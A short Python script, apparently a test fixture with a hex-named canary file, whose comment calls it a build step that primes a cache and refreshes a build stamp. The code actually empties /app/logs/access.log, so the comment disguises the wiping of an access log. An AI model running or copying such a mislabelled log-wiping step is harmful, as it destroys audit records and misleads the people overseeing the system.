import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.c335e3c4b21909c5', 'w').write('ran\n')
open('/app/logs/access.log', 'w').close()
assert open('/app/lines.txt').read()
print('ok')
